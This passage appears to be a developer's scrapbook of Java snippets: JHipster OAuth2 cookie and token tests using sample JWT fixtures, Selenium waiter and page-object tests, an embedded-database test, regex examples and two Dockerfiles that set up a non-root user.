    public static final String NEW_ACCESS_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE0OTQyNzY2NDEsInVzZXJfbmFtZSI6InVzZXIiLCJhdXRob3JpdGllcyI6WyJST0xFX1VTRVIiXSwianRpIjoiYzIyY2YzMDgtZTIyYi00YzNjLWI5MjctOTYwYzA2YmY1ZmU0IiwiY2xpZW50X2lkIjoid2ViX2FwcCIsInNjb3BlIjpbIm9wZW5pZCJdfQ.IAhE39GCqWRUuXdWy-raOcE9NYXRhGiqkeJH649501LeqNPH5HtRUNWmudVRgwT52Bj7HcbJapMLGetKIMEASqC1-WARfcZ_PR0r7Kfg3OlFALWOH_oVT5kvi2H-QCoSAF9mRYK6abCh_tPk5KryVB5c7YxTMIXDT2nTsSexD8eNQOMBWRCg0RaLHZ9bKfeyVgncQJsu7-vTo1xJyh-keYpdNZ0TA2SjYJgezmB7gwW1Kmc7_83htr8VycG7XA_PuD9--yRNlrN0LtNHEBqNypZsOe6NvpKiNlodFYHlsU1CaumzcF9U7dpVanjIUKJ5VRWVUlSFY6JJ755W29VCTw";
    public static final String NEW_REFRESH_TOKEN_VALUE = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJ1c2VyIiwic2NvcGUiOlsib3BlbmlkIl0sImF0aSI6ImMyMmNmMzA4LWUyMmItNGMzYy1iOTI3LTk2MGMwNmJmNWZlNCIsImV4cCI6MTQ5Njg2ODU4MSwiYXV0aG9yaXRpZXMiOlsiUk9MRV9VU0VSIl0sImp0aSI6ImU4YmZhZWJlLWYzMDItNGNjZS1hZGY1LWQ4MzE5OWM1MjBlOSIsImNsaWVudF9pZCI6IndlYl9hcHAifQ.OemWBUfc-2rl4t4VVqolYxul3L527PbSbX2Xvo7oyy3Vy5nmmblqp4hVGdTEjivrlldGVQX03ERbrA-oFkpmfWbBzLvnKS6AUq1MGjut6dXZJeiEqNYmiAABn6jSgK26S0k6b2ADgmf7mxJO8EBypb5sT1DMAbY5cbOe7r4ZG7zMTVSvlvjHTXp_FM8Y9i6nehLD4XDYY57cb_ZA89vAXNzvTAjoopDliExgR0bApG6nvvDEhEYgTS65lccEQocoev6bISJ3RvNYNPJxWcNPftKDp4HrEt2E2WP28K5IivRtQgDQNlQeormf1tp6AG-Oj__NXyAPM7yhAKXNy2zWdQ";
    @Mock
    private RestTemplate restTemplate;
    @Mock
    private TokenStore tokenStore;
    private OAuth2TokenEndpointClient authorizationClient;
    private OAuth2AuthenticationService authenticationService;
    private RefreshTokenFilter refreshTokenFilter;
    @Rule
    public ExpectedException expectedException = ExpectedException.none();
    private OAuth2Properties oAuth2Properties;
    private JHipsterProperties jHipsterProperties;

    @Before
    public void init() {
        oAuth2Properties = new OAuth2Properties();
        jHipsterProperties = new JHipsterProperties();
        jHipsterProperties.getSecurity().getClientAuthorization().setAccessTokenUri("http://uaa/oauth/token");
        OAuth2CookieHelper cookieHelper = new OAuth2CookieHelper(oAuth2Properties);
        OAuth2AccessToken accessToken = createAccessToken(ACCESS_TOKEN_VALUE, REFRESH_TOKEN_VALUE);

        mockInvalidPassword();
        mockPasswordGrant(accessToken);
        mockRefreshGrant();

        authorizationClient = new UaaTokenEndpointClient(restTemplate, jHipsterProperties, oAuth2Properties);
        authenticationService = new OAuth2AuthenticationService(authorizationClient, cookieHelper);
        when(tokenStore.readAccessToken(ACCESS_TOKEN_VALUE)).thenReturn(accessToken);
        refreshTokenFilter = new RefreshTokenFilter(authenticationService, tokenStore);
    }

    public static OAuth2AccessToken createAccessToken(String accessTokenValue, String refreshTokenValue) {
        DefaultOAuth2AccessToken accessToken = new DefaultOAuth2AccessToken(accessTokenValue);
        accessToken.setExpiration(new Date());          //token expires now
        DefaultOAuth2RefreshToken refreshToken = new DefaultOAuth2RefreshToken(refreshTokenValue);
        accessToken.setRefreshToken(refreshToken);
        return accessToken;
    }

    public static MockHttpServletRequest createMockHttpServletRequest() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        Cookie accessTokenCookie = new Cookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE, ACCESS_TOKEN_VALUE);
        Cookie refreshTokenCookie = new Cookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE, REFRESH_TOKEN_VALUE);
        request.setCookies(accessTokenCookie, refreshTokenCookie);
        return request;
    }

    private void mockInvalidPassword() {
        HttpHeaders reqHeaders = new HttpHeaders();
        reqHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        reqHeaders.add("Authorization", CLIENT_AUTHORIZATION);                //take over Authorization header from client request to UAA request
        MultiValueMap<String, String> formParams = new LinkedMultiValueMap<>();
        formParams.set("username", "user");
        formParams.set("password", "user2");
        formParams.add("grant_type", "password");
        HttpEntity<MultiValueMap<String, String>> entity = new HttpEntity<>(formParams, reqHeaders);
        when(restTemplate.postForEntity("http://uaa/oauth/token", entity, OAuth2AccessToken.class))
            .thenThrow(new HttpClientErrorException(HttpStatus.BAD_REQUEST));
    }

    private void mockPasswordGrant(OAuth2AccessToken accessToken) {
        HttpHeaders reqHeaders = new HttpHeaders();
        reqHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        reqHeaders.add("Authorization", CLIENT_AUTHORIZATION);                //take over Authorization header from client request to UAA request
        MultiValueMap<String, String> formParams = new LinkedMultiValueMap<>();
        formParams.set("username", "user");
        formParams.set("password", "user");
        formParams.add("grant_type", "password");
        HttpEntity<MultiValueMap<String, String>> entity = new HttpEntity<>(formParams, reqHeaders);
        when(restTemplate.postForEntity("http://uaa/oauth/token", entity, OAuth2AccessToken.class))
            .thenReturn(new ResponseEntity<OAuth2AccessToken>(accessToken, HttpStatus.OK));
    }

    private void mockRefreshGrant() {
        MultiValueMap<String, String> params = new LinkedMultiValueMap<>();
        params.add("grant_type", "refresh_token");
        params.add("refresh_token", REFRESH_TOKEN_VALUE);
        //we must authenticate with the UAA server via HTTP basic authentication using the browser's client_id with no client secret
        HttpHeaders headers = new HttpHeaders();
        headers.add("Authorization", CLIENT_AUTHORIZATION);
        HttpEntity<MultiValueMap<String, String>> entity = new HttpEntity<>(params, headers);
        OAuth2AccessToken newAccessToken = createAccessToken(NEW_ACCESS_TOKEN_VALUE, NEW_REFRESH_TOKEN_VALUE);
        when(restTemplate.postForEntity("http://uaa/oauth/token", entity, OAuth2AccessToken.class))
            .thenReturn(new ResponseEntity<OAuth2AccessToken>(newAccessToken, HttpStatus.OK));
    }

    @Test
    public void testAuthenticationCookies() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("www.test.com");
        request.addHeader("Authorization", CLIENT_AUTHORIZATION);
        Map<String, String> params = new HashMap<>();
        params.put("username", "user");
        params.put("password", "user");
        params.put("rememberMe", "true");
        MockHttpServletResponse response = new MockHttpServletResponse();
        authenticationService.authenticate(request, response, params);
        //check that cookies are set correctly
        Cookie accessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(ACCESS_TOKEN_VALUE, accessTokenCookie.getValue());
        Cookie refreshTokenCookie = response.getCookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE);
        Assert.assertEquals(REFRESH_TOKEN_VALUE, OAuth2CookieHelper.getRefreshTokenValue(refreshTokenCookie));
        Assert.assertTrue(OAuth2CookieHelper.isRememberMe(refreshTokenCookie));
    }

    @Test
    public void testAuthenticationNoRememberMe() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("www.test.com");
        Map<String, String> params = new HashMap<>();
        params.put("username", "user");
        params.put("password", "user");
        params.put("rememberMe", "false");
        MockHttpServletResponse response = new MockHttpServletResponse();
        authenticationService.authenticate(request, response, params);
        //check that cookies are set correctly
        Cookie accessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(ACCESS_TOKEN_VALUE, accessTokenCookie.getValue());
        Cookie refreshTokenCookie = response.getCookie(OAuth2CookieHelper.SESSION_TOKEN_COOKIE);
        Assert.assertEquals(REFRESH_TOKEN_VALUE, OAuth2CookieHelper.getRefreshTokenValue(refreshTokenCookie));
        Assert.assertFalse(OAuth2CookieHelper.isRememberMe(refreshTokenCookie));
    }

    @Test
    public void testInvalidPassword() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("www.test.com");
        Map<String, String> params = new HashMap<>();
        params.put("username", "user");
        params.put("password", "user2");
        params.put("rememberMe", "false");
        MockHttpServletResponse response = new MockHttpServletResponse();
        expectedException.expect(InvalidPasswordException.class);
        authenticationService.authenticate(request, response, params);
    }

    @Test
    public void testRefreshGrant() {
        MockHttpServletRequest request = createMockHttpServletRequest();
        MockHttpServletResponse response = new MockHttpServletResponse();
        HttpServletRequest newRequest = refreshTokenFilter.refreshTokensIfExpiring(request, response);
        Cookie newAccessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(NEW_ACCESS_TOKEN_VALUE, newAccessTokenCookie.getValue());
        Cookie newRefreshTokenCookie = response.getCookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE);
        Assert.assertEquals(NEW_REFRESH_TOKEN_VALUE, newRefreshTokenCookie.getValue());
        Cookie requestAccessTokenCookie = OAuth2CookieHelper.getAccessTokenCookie(newRequest);
        Assert.assertEquals(NEW_ACCESS_TOKEN_VALUE, requestAccessTokenCookie.getValue());
    }

    @Test
    public void testSessionExpired() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        Cookie accessTokenCookie = new Cookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE, ACCESS_TOKEN_VALUE);
        Cookie refreshTokenCookie = new Cookie(OAuth2CookieHelper.SESSION_TOKEN_COOKIE, EXPIRED_SESSION_TOKEN_VALUE);
        request.setCookies(accessTokenCookie, refreshTokenCookie);
        MockHttpServletResponse response = new MockHttpServletResponse();
        HttpServletRequest newRequest = refreshTokenFilter.refreshTokensIfExpiring(request, response);
        //cookies in response are deleted
        Cookie newAccessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(0, newAccessTokenCookie.getMaxAge());
        Cookie newRefreshTokenCookie = response.getCookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE);
        Assert.assertEquals(0, newRefreshTokenCookie.getMaxAge());
        //request no longer contains cookies
        Cookie requestAccessTokenCookie = OAuth2CookieHelper.getAccessTokenCookie(newRequest);
        Assert.assertNull(requestAccessTokenCookie);
        Cookie requestRefreshTokenCookie = OAuth2CookieHelper.getRefreshTokenCookie(newRequest);
        Assert.assertNull(requestRefreshTokenCookie);
    }

    /**
     * If no refresh token is found and the access token has expired, then expect an exception.
     */
    @Test
    public void testRefreshGrantNoRefreshToken() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        Cookie accessTokenCookie = new Cookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE, ACCESS_TOKEN_VALUE);
        request.setCookies(accessTokenCookie);
        MockHttpServletResponse response = new MockHttpServletResponse();
        expectedException.expect(InvalidTokenException.class);
        refreshTokenFilter.refreshTokensIfExpiring(request, response);
    }

    @Test
    public void testLogout() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        Cookie accessTokenCookie = new Cookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE, ACCESS_TOKEN_VALUE);
        Cookie refreshTokenCookie = new Cookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE, REFRESH_TOKEN_VALUE);
        request.setCookies(accessTokenCookie, refreshTokenCookie);
        MockHttpServletResponse response = new MockHttpServletResponse();
        authenticationService.logout(request, response);
        Cookie newAccessTokenCookie = response.getCookie(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE);
        Assert.assertEquals(0, newAccessTokenCookie.getMaxAge());
        Cookie newRefreshTokenCookie = response.getCookie(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE);
        Assert.assertEquals(0, newRefreshTokenCookie.getMaxAge());
    }

    @Test
    public void testStripTokens() {
        MockHttpServletRequest request = createMockHttpServletRequest();
        HttpServletRequest newRequest = authenticationService.stripTokens(request);
        CookieCollection cookies = new CookieCollection(newRequest.getCookies());
        Assert.assertFalse(cookies.contains(OAuth2CookieHelper.ACCESS_TOKEN_COOKIE));
        Assert.assertFalse(cookies.contains(OAuth2CookieHelper.REFRESH_TOKEN_COOKIE));
    }
}

 
 
 
 
package com.baeldung.jhipster.gateway.security.oauth2;

import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.springframework.http.HttpMethod;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.security.core.Authentication;
import org.springframework.security.oauth2.common.OAuth2AccessToken;

/**
 * Test whether the CookieTokenExtractor can properly extract access tokens from
 * Cookies and Headers.
 */
public class CookieTokenExtractorTest {
    private CookieTokenExtractor cookieTokenExtractor;

    @Before
    public void init() {
        cookieTokenExtractor = new CookieTokenExtractor();
    }

    @Test
    public void testExtractTokenCookie() {
        MockHttpServletRequest request = OAuth2AuthenticationServiceTest.createMockHttpServletRequest();
        Authentication authentication = cookieTokenExtractor.extract(request);
        Assert.assertEquals(OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE, authentication.getPrincipal().toString());
    }

    @Test
    public void testExtractTokenHeader() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        request.addHeader("Authorization", OAuth2AccessToken.BEARER_TYPE + " " + OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE);
        Authentication authentication = cookieTokenExtractor.extract(request);
        Assert.assertEquals(OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE, authentication.getPrincipal().toString());
    }

    @Test
    public void testExtractTokenParam() {
        MockHttpServletRequest request = new MockHttpServletRequest(HttpMethod.GET.name(), "http://www.test.com");
        request.addParameter(OAuth2AccessToken.ACCESS_TOKEN, OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE);
        Authentication authentication = cookieTokenExtractor.extract(request);
        Assert.assertEquals(OAuth2AuthenticationServiceTest.ACCESS_TOKEN_VALUE, authentication.getPrincipal().toString());
    }
}

 
https://blog.csdn.net/liusanyu/article/details/78840483
 
 
@RunWith(SpringRunner.class)
@DataJpaTest
@AutoConfigureEmbeddedDatabase
public class SpringDataJpaAnnotationTest {

    @Autowired
    private PersonRepository personRepository;

    @Test
    public void testEmbeddedDatabase() {
        Optional<Person> personOptional = personRepository.findById(1L);

        assertThat(personOptional).hasValueSatisfying(person -> {
            assertThat(person.getId()).isNotNull();
            assertThat(person.getFirstName()).isEqualTo("Dave");
            assertThat(person.getLastName()).isEqualTo("Syer");
        });
    }
}

Standard Dockerfile
FROM openjdk:8-jdk

RUN groupadd --system --gid 1000 test
RUN useradd --system --gid test --uid 1000 --shell /bin/bash --create-home test

USER test
WORKDIR /home/test
Alpine Dockerfile
FROM openjdk:8-jdk-alpine

RUN addgroup -S -g 1000 test
RUN adduser -D -S -G test -u 1000 -s /bin/ash test

USER test
WORKDIR /home/test
--------------------------------------------------------------------------------------------------------
String complexString = "3ifhuq023hjk@jka$ksoap";
complexString.replaceAll("\\D", "")


String complexString = "3ifhuq023hjk@jka$ksoap";
complexString.replaceAll("\\d", "")

str.replaceAll("[^\\p{Alnum}\\s]", "")
--------------------------------------------------------------------------------------------------------

import browser.BrowserGetter;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import pageobjects.waiter.WaiterPage;
import waiter.Waiter;

public class ClickTest {
    private Waiter waiter = new Waiter();
    private WaiterPage page;
    private WebDriver driver;
    private BrowserGetter browserGetter = new BrowserGetter();

    @BeforeClass
    public void beforeClass() {
        //initialize the Chrome browser here
        driver = browserGetter.getChromeDriver();
        //initialize page object class
        page = PageFactory.initElements(driver, WaiterPage.class);
    }

    @AfterClass
    public void afterClass() {
        driver.quit();
    }

    @Test
    public void clickTest() {
        waiter.get("https://imalittletester.com", driver);
        waiter.click(page.searchButton, driver);
        waiter.click(page.menuLink, driver);
    }

    @Test
    public void clickTestSpecifiedTimeout() {
        waiter.get("https://imalittletester.com", driver);
        waiter.click(page.searchButton, driver, 5);
        waiter.click(page.menuLink, driver, 20);
    }
}
--------------------------------------------------------------------------------------------------------
import browser.BrowserGetter;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import pageobjects.waiter.WaiterPage;
import waiter.Waiter;

public class UrlTest {
    private Waiter waiter = new Waiter();
    private WaiterPage page;
    private WebDriver driver;
    private BrowserGetter browserGetter = new BrowserGetter();

    @BeforeClass
    public void beforeClass() {
        //initialize the Chrome browser here
        driver = browserGetter.getChromeDriver();
        //initialize page object class
        page = PageFactory.initElements(driver, WaiterPage.class);
    }

    @AfterClass
    public void afterClass() {
        driver.quit();
    }

    @Test
    public void waitForUrlEqualsOrContains() {
        waiter.get("https://imalittletester.com", driver);

        waiter.click(page.searchButton, driver);
        page.searchField.sendKeys("checkstyle");
        page.searchField.sendKeys(Keys.ENTER);
        waiter.waitForUrl("https://imalittletester.com/?s=checkstyle", driver);

        waiter.click(page.searchButton, driver);
        page.searchField.clear();
        page.searchField.sendKeys("waiter");
        page.searchField.sendKeys(Keys.ENTER);
        waiter.waitForUrlContains("waiter", driver);

        waiter.click(page.searchButton, driver);
        page.searchField.clear();
        page.searchField.sendKeys("CheckStyle");
        page.searchField.sendKeys(Keys.ENTER);
        //the actual URL that will open here is: https://imalittletester.com/?s=checkstyle
        waiter.waitForUrl_IgnoreCase("https://imalittletester.com/?s=checkstyle", driver);

        waiter.click(page.searchButton, driver);
        page.searchField.clear();
        page.searchField.sendKeys("WAITER");
        page.searchField.sendKeys(Keys.ENTER);
        //the actual url that will open is: https://imalittletester.com/?s=WAITER
        waiter.waitForUrlContains_IgnoreCase("waiter", driver);

    }

    @Test
    public void urlStartsWith() {
        waiter.get("http://imalittletester.com", driver);
        waiter.waitForUrlStartsWith("https", driver);
    }

    @Test
    public void waitForUrlEqualsOrContainsWithSpecifiedTimeout() {
        waiter.get("https://imalittletester.com", driver);

        waiter.click(page.searchButton, driver);
        page.searchField.sendKeys("checkstyle");
        page.searchField.sendKeys(Keys.ENTER);
        waiter.waitForUrl("https://imalittletester.com/?s=checkstyle", driver, 15);

        waiter.click(page.searchButton, driver);
        page.searchField.clear();
        page.searchField.sendKeys("waiter");
        page.searchField.sendKeys(Keys.ENTER);
        waiter.waitForUrlContains("waiter", driver, 15);

        waiter.click(page.searchButton, driver);
        page.searchField.clear();
        page.searchField.sendKeys("CheckStyle");
        page.searchField.sendKeys(Keys.ENTER);
        //the actual URL that will open here is: https://imalittletester.com/?s=checkstyle
        waiter.waitForUrl_IgnoreCase("https://imalittletester.com/?s=checkstyle", driver, 15);

        waiter.click(page.searchButton, driver);
        page.searchField.clear();
        page.searchField.sendKeys("WAITER");
        page.searchField.sendKeys(Keys.ENTER);
        //the actual url that will open is: https://imalittletester.com/?s=WAITER
        waiter.waitForUrlContains_IgnoreCase("waiter", driver, 15);

    }

    @Test
    public void urlStartsWithAndSpecifiedTimeout() {
        waiter.get("http://imalittletester.com", driver);
        waiter.waitForUrlStartsWith("https", driver, 5);
    }
}
--------------------------------------------------------------------------------------------------------
import browser.BrowserGetter;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import pageobjects.waiter.WaiterPage;
import waiter.Waiter;

public class GetTest {
    private Waiter waiter = new Waiter();
    private WaiterPage page;
    private WebDriver driver;
    private BrowserGetter browserGetter = new BrowserGetter();

    @BeforeClass
    public void beforeClass() {
        //initialize the Chrome browser here
        driver = browserGetter.getChromeDriver();
        //initialize page object class
        page = PageFactory.initElements(driver, WaiterPage.class);
    }

    @AfterClass
    public void afterClass() {
        driver.quit();
    }

    /**
     * A test that opens a page and waits for it to be fully loaded
     * Uses implicit timeout of 30 seconds which is set in the Waiter class
     */
    @Test
    public void getTest() {
        waiter.get("http://www.google.com", driver);
    }

    /**
     * A test that opens a page and waits for it to be fully loaded for 10 seconds
     */
    @Test
    public void getTestTimeout10Seconds() {
        waiter.get("http://www.google.com", driver, 10);
    }

    /**
     * A test that opens a page and waits for it to be fully loaded
     * Then it waits for a WebElement, declared in the WaiterPage class, to be displayed
     * Uses implicit timeout of 30 seconds which is set in the Waiter class
     */
    @Test
    public void getAndWaitForElementToBeDisplayedTest() {
        waiter.getAndWaitForElementToBeDisplayed("http://www.bing.com", page.bingSearchField, driver);
    }

    /**
     * A test that opens a page and waits for it to be fully loaded for 10 seconds
     * Then it waits for a WebElement, declared in the WaiterPage class, to be displayed, for 10 seconds
     */
    @Test
    public void getAndWaitForElementToBeDisplayedTestTimeout10Seconds() {
        waiter.getAndWaitForElementToBeDisplayed("http://www.bing.com", page.bingSearchField, driver, 10);
    }

    /**
     * A test that opens a URL in the browser, but waits for another URL to load.
     * This is useful when some redirects are being made and you are interested in landing on the second provided URL.
     * Also waits for the final URL's page to load completely, for the default timeout value of 30 seconds
     */
    @Test
    public void getUrlAndWaitForUrl() {
        waiter.getUrlAndWaitForUrl("http://imalittletester.com/", "https://imalittletester.com/", driver);
    }

    /**
     * A test that opens a URL in the browser, but waits for another URL to load.
     * This is useful when some redirects are being made and you are interested in landing on the second provided URL.
     * Also waits for the final URL's page to load completely, for the specified timeout of 5 seconds
     */
    @Test
    public void getUrlAndWaitForUrlTimeout5Seconds() {
        waiter.getUrlAndWaitForUrl("http://imalittletester.com/", "https://imalittletester.com/", driver, 5);
    }

    /**
     * This test illustrates how to use the waitForPageLoadComplete method on its own.
     * The test just opens a page, refreshes it, and waits for it to load completely after the refresh.
     * Uses the default timeout value from thewaiter library
     */
    @Test
    public void waitForPageLoadComplete() {
        waiter.get("http://www.google.com", driver);
        driver.navigate().refresh();
        waiter.waitForPageLoadComplete(driver);
    }

    /**
     * This test illustrates how to use the waitForPageLoadComplete method on its own.
     * The test just opens a page, refreshes it, and waits for it to load completely after the refresh.
     * Waits for 10 seconds for the page to load after the refresh
     */
    @Test
    public void waitForPageLoadCompleteTimeout10Seconds() {
        waiter.get("http://www.google.com", driver);
        driver.navigate().refresh();
        waiter.waitForPageLoadComplete(driver, 10);
    }
}
--------------------------------------------------------------------------------------------------------
import browser.BrowserGetter;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import pageobjects.waiter.WaiterPage;
import waiter.Waiter;

public class ClickTest {
    private Waiter waiter = new Waiter();
    private WaiterPage page;
    private WebDriver driver;
    private BrowserGetter browserGetter = new BrowserGetter();

    @BeforeClass
    public void beforeClass() {
        //initialize the Chrome browser here
        driver = browserGetter.getChromeDriver();
        //initialize page object class
        page = PageFactory.initElements(driver, WaiterPage.class);
    }

    @AfterClass
    public void afterClass() {
        driver.quit();
    }

    @Test
    public void clickTest() {
        waiter.get("https://imalittletester.com", driver);
        waiter.click(page.searchButton, driver);
        waiter.click(page.menuLink, driver);
    }

    @Test
    public void clickTestSpecifiedTimeout() {
        waiter.get("https://imalittletester.com", driver);
        waiter.click(page.searchButton, driver, 5);
        waiter.click(page.menuLink, driver, 20);
    }
}
--------------------------------------------------------------------------------------------------------

import org.openqa.selenium.By;
import org.openqa.selenium.WebElement;

public class Module {
    private Image image;
    private String h2Text;

    public Module(Image image, String h2Text) {
        this.image = image;
        this.h2Text = h2Text;
    }

    public Module(WebElement element) {
        this.image = new Image(element.findElement(By.cssSelector("img")));
        this.h2Text = element.findElement(By.cssSelector("h2")).getText();
    }

    @Override
    public boolean equals(Object o) {
        if (this == o)
            return true;
        if (o == null || getClass() != o.getClass())
            return false;

        Module module = (Module) o;

        if (image != null ? !image.equals(module.image) : module.image != null)
            return false;
        return h2Text != null ? h2Text.equals(module.h2Text) : module.h2Text == null;
    }

    @Override
    public int hashCode() {
        int result = image != null ? image.hashCode() : 0;
        result = 31 * result + (h2Text != null ? h2Text.hashCode() : 0);
        return result;
    }

    @Override
    public String toString() {
        return "Module{" +
                "image=" + image +
                ", h2Text='" + h2Text + '\'' +
                '}';
    }
}
--------------------------------------------------------------------------------------------------------
import browser.BrowserGetter;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import pageobjects.stpcon17.ModulesPage;

import java.io.File;

import static org.testng.Assert.assertEquals;

public class ModulesTest {

    private final Image readingModuleImage = new Image("https://c1.staticflickr.com/8/7494/27510788280_a9f43c3845_s" +
            ".jpg", "125", "125");
    private final Image travelModuleImage = new Image("https://farm2.staticflickr.com/1642/25881055090_e29679a37d_q" +
            ".jpg", "125", "125");
    private final Image photoModuleImage = new Image("https://farm1.staticflickr.com/612/32840145345_4bdf828d8f_q" +
            ".jpg", "125", "125");

    private final Module readingModule = new Module(readingModuleImage, "Go ahead. Read something!");
    private final Module travelModule = new Module(travelModuleImage, "Go out, do some sightseeing!");
    private final Module photoModule = new Module(photoModuleImage, "Chill. Look at some photos!");

    //webDriver instance
    private WebDriver webDriver;
    //class used for initializing browser
    private BrowserGetter browserGetter = new BrowserGetter();
    //page object class
    private ModulesPage page;

    @BeforeClass
    public void beforeClass() {
        //initialize the Chrome browser here
        webDriver = browserGetter.getChromeDriver();
        //initialize page object class
        page = PageFactory.initElements(webDriver, ModulesPage.class);
        webDriver.get(new File("src/test/resources/htmls/testconlt17/newPage.html").getAbsolutePath());
    }

    @AfterClass
    public void afterClass() {
        webDriver.quit();
    }

    @Test
    public void images() throws InterruptedException {
        assertEquals(new Image(page.readingModuleImageElement), readingModuleImage);
        assertEquals(new Image(page.travelModuleImageElement), travelModuleImage);
        assertEquals(new Image(page.photoModuleImageElement), photoModuleImage);
    }


    @Test
    public void modules() {
        assertEquals(new Module(page.readingModuleElement), readingModule);
        assertEquals(new Module(page.travelModuleElement), travelModule);
        assertEquals(new Module(page.photoModuleElement), photoModule);
    }
}
--------------------------------------------------------------------------------------------------------
import org.openqa.selenium.By;
import org.openqa.selenium.WebElement;

public class Module {
    private Image image;
    private String h2Text;
    private Link link;

    public Module(Image image, String h2Text, Link link) {
        this.image = image;
        this.h2Text = h2Text;
        this.link = link;
    }

    public Module(WebElement element) {
        this.image = new Image(element.findElement(By.cssSelector("img")));
        this.h2Text = element.findElement(By.cssSelector("h2")).getText();
        this.link = new Link(element.findElement(By.cssSelector("a")));
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;

        Module module = (Module) o;

        if (image != null ? !image.equals(module.image) : module.image != null) return false;
        if (h2Text != null ? !h2Text.equals(module.h2Text) : module.h2Text != null) return false;
        return link != null ? link.equals(module.link) : module.link == null;
    }

    @Override
    public int hashCode() {
        int result = image != null ? image.hashCode() : 0;
        result = 31 * result + (h2Text != null ? h2Text.hashCode() : 0);
        result = 31 * result + (link != null ? link.hashCode() : 0);
        return result;
    }

    @Override
    public String toString() {
        return "Module{" +
                "image=" + image +
                ", h2Text='" + h2Text + '\'' +
                ", link=" + link +
                '}';
    }
}
--------------------------------------------------------------------------------------------------------
import browser.BrowserGetter;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
import pageobjects.stpcon17.ModulesPage;

import java.io.File;

import static org.testng.Assert.assertEquals;

public class ModulesTest {

    private final Image readingModuleImage = new Image("https://c1.staticflickr.com/8/7494/27510788280_a9f43c3845_s" +
            ".jpg", "125", "125");
    private final Image travelModuleImage = new Image("https://farm2.staticflickr.com/1642/25881055090_e29679a37d_q" +
            ".jpg", "125", "125");
    private final Image photoModuleImage = new Image("https://farm1.staticflickr.com/612/32840145345_4bdf828d8f_q" +
            ".jpg", "125", "125");

    private final Link readingModuleLink = new Link("http://iamalittletester.wordpress.com/", "Read about testing",
            "_blank");
    private final Link travelModuleLink = new Link("http://travelwithcori.wordpress.com/", "Read a travel blog",
            "_blank");
    private final Link photoModuleLink = new Link("https://www.flickr.com/photos/capreoara", "Look at photos",
            "_blank");

    private final Module readingModule = new Module(readingModuleImage, "Go ahead. Read something!", readingModuleLink);
    private final Module travelModule = new Module(travelModuleImage, "Go out, do some sightseeing!", travelModuleLink);
    private final Module photoModule = new Module(photoModuleImage, "Chill. Look at some photos!", photoModuleLink);

    //webDriver instance
    private WebDriver webDriver;
    //class used for initializing browser
    private BrowserGetter browserGetter = new BrowserGetter();
    //page object class
    private ModulesPage page;

    @BeforeClass
    public void beforeClass() {
        //initialize the Chrome browser here
        webDriver = browserGetter.getChromeDriver();
        //initialize page object class
        page = PageFactory.initElements(webDriver, ModulesPage.class);
        webDriver.get(new File("src/test/resources/htmls/stpcon17/fullPage.html").getAbsolutePath());
    }

    @AfterClass
    public void afterClass() {
        webDriver.quit();
    }

    @Test
    public void images() throws InterruptedException {
        assertEquals(new Image(page.readingModuleImageElement), readingModuleImage);
        assertEquals(new Image(page.travelModuleImageElement), travelModuleImage);
        assertEquals(new Image(page.photoModuleImageElement), photoModuleImage);
    }

    @Test
    public void links() {
        assertEquals(new Link(page.readingModuleLinkElement), readingModuleLink);
